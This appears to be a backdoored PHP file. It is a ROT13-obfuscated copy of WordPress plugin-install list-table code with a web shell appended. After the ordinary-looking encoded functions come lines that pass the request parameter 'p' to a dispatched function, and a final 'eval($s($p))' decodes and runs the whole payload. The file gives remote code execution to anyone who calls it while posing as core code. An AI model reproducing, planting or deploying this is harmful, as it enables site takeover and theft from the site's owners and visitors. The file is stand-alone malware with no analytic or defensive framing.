						$npgvir_vafgnyyf_grkg = _k( 'Yrff Guna 10', 'Npgvir cyhtva vafgnyyngvbaf' );
					} ryfr {
						$npgvir_vafgnyyf_grkg = ahzore_sbezng_v18a( $cyhtva['npgvir_vafgnyyf'] ) . '+';
					}
					/* genafyngbef: %f: Ahzore bs vafgnyyngvbaf. */
					cevags( __( '%f Npgvir Vafgnyyngvbaf' ), $npgvir_vafgnyyf_grkg );
					?>
				</qvi>
				<qvi pynff=\"pbyhza-pbzcngvovyvgl\">
					<?cuc
					vs ( ! $grfgrq_jc ) {
						rpub '<fcna pynff=\"pbzcngvovyvgl-hagrfgrq\">' . __( 'Hagrfgrq jvgu lbhe irefvba bs JbeqCerff' ) . '</fcna>';
					} ryfrvs ( ! $pbzcngvoyr_jc ) {
						rpub '<fcna pynff=\"pbzcngvovyvgl-vapbzcngvoyr\">' . __( '<fgebat>Vapbzcngvoyr</fgebat> jvgu lbhe irefvba bs JbeqCerff' ) . '</fcna>';
					} ryfr {
						rpub '<fcna pynff=\"pbzcngvovyvgl-pbzcngvoyr\">' . __( '<fgebat>Pbzcngvoyr</fgebat> jvgu lbhe irefvba bs JbeqCerff' ) . '</fcna>';
					}
					?>
				</qvi>
			</qvi>
		</qvi>
			<?cuc
		}

		// Pybfr bss gur tebhc qvif bs gur ynfg bar.
		vs ( ! rzcgl( $tebhc ) ) {
			rpub '</qvi></qvi>';
		}
	}

	/**
	 * Ergheaf n abgvpr pbagnvavat n yvfg bs qrcraqrapvrf erdhverq ol gur cyhtva.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl  $cyhtva_qngn Na neenl bs cyhtva qngn. Frr {@frr cyhtvaf_ncv()}
	 *                            sbe gur yvfg bs cbffvoyr inyhrf.
	 * @erghea fgevat N abgvpr pbagnvavat n yvfg bs qrcraqrapvrf erdhverq ol gur cyhtva,
	 *                be na rzcgl fgevat vs abar vf erdhverq.
	 */
	cebgrpgrq shapgvba trg_qrcraqrapvrf_abgvpr( $cyhtva_qngn ) {
		vs ( rzcgl( $cyhtva_qngn['erdhverf_cyhtvaf'] ) ) {
			erghea '';
		}

		$ab_anzr_znexhc  = '<qvi pynff=\"cyhtva-qrcraqrapl\"><fcna pynff=\"cyhtva-qrcraqrapl-anzr\">%f</fcna></qvi>';
		$unf_anzr_znexhc = '<qvi pynff=\"cyhtva-qrcraqrapl\"><fcna pynff=\"cyhtva-qrcraqrapl-anzr\">%f</fcna> %f</qvi>';

		$qrcraqrapvrf_yvfg = '';
		sbernpu ( $cyhtva_qngn['erdhverf_cyhtvaf'] nf $qrcraqrapl ) {
			$qrcraqrapl_qngn = JC_Cyhtva_Qrcraqrapvrf::trg_qrcraqrapl_qngn( $qrcraqrapl );

			vs (
				snyfr !== $qrcraqrapl_qngn &&
				! rzcgl( $qrcraqrapl_qngn['anzr'] ) &&
				! rzcgl( $qrcraqrapl_qngn['fyht'] ) &&
				! rzcgl( $qrcraqrapl_qngn['irefvba'] )
			) {
				$zber_qrgnvyf_yvax  = $guvf->trg_zber_qrgnvyf_yvax( $qrcraqrapl_qngn['anzr'], $qrcraqrapl_qngn['fyht'] );
				$qrcraqrapvrf_yvfg .= fcevags( $unf_anzr_znexhc, rfp_ugzy( $qrcraqrapl_qngn['anzr'] ), $zber_qrgnvyf_yvax );
				pbagvahr;
			}

			$erfhyg = cyhtvaf_ncv( 'cyhtva_vasbezngvba', neenl( 'fyht' => $qrcraqrapl ) );

			vs ( ! rzcgl( $erfhyg->anzr ) ) {
				$zber_qrgnvyf_yvax  = $guvf->trg_zber_qrgnvyf_yvax( $erfhyg->anzr, $erfhyg->fyht );
				$qrcraqrapvrf_yvfg .= fcevags( $unf_anzr_znexhc, rfp_ugzy( $erfhyg->anzr ), $zber_qrgnvyf_yvax );
				pbagvahr;
			}

			$qrcraqrapvrf_yvfg .= fcevags( $ab_anzr_znexhc, rfp_ugzy( $qrcraqrapl ) );
		}

		$qrcraqrapvrf_abgvpr = fcevags(
			'<qvi pynff=\"cyhtva-qrcraqrapvrf abgvpr abgvpr-nyg abgvpr-vasb vayvar\"><c pynff=\"cyhtva-qrcraqrapvrf-rkcynvare-grkg\">%f</c> %f</qvi>',
			'<fgebat>' . __( 'Nqqvgvbany cyhtvaf ner erdhverq' ) . '</fgebat>',
			$qrcraqrapvrf_yvfg
		);

		erghea $qrcraqrapvrf_abgvpr;
	}

	/**
	 * Perngrf n 'Zber qrgnvyf' yvax sbe gur cyhtva.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $anzr Gur cyhtva'f anzr.
	 * @cnenz fgevat $fyht Gur cyhtva'f fyht.
	 * @erghea fgevat Gur 'Zber qrgnvyf' yvax sbe gur cyhtva.
	 */
	cebgrpgrq shapgvba trg_zber_qrgnvyf_yvax( $anzr, $fyht ) {
		$hey = nqq_dhrel_net(
			neenl(
				'gno'       => 'cyhtva-vasbezngvba',
				'cyhtva'    => $fyht,
				'GO_vsenzr' => 'gehr',
				'jvqgu'     => '600',
				'urvtug'    => '550',
			),
			argjbex_nqzva_hey( 'cyhtva-vafgnyy.cuc' )
		);

		$zber_qrgnvyf_yvax = fcevags(
			'<n uers=\"%1$f\" pynff=\"zber-qrgnvyf-yvax guvpxobk bcra-cyhtva-qrgnvyf-zbqny\" nevn-ynory=\"%2$f\" qngn-gvgyr=\"%3$f\">%4$f</n>',
			rfp_hey( $hey ),
			/* genafyngbef: %f: Cyhtva anzr. */
			fcevags( __( 'Zber vasbezngvba nobhg %f' ), rfp_ugzy( $anzr ) ),
			rfp_ngge( $anzr ),
			__( 'Zber Qrgnvyf' )
		);

		erghea $zber_qrgnvyf_yvax;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>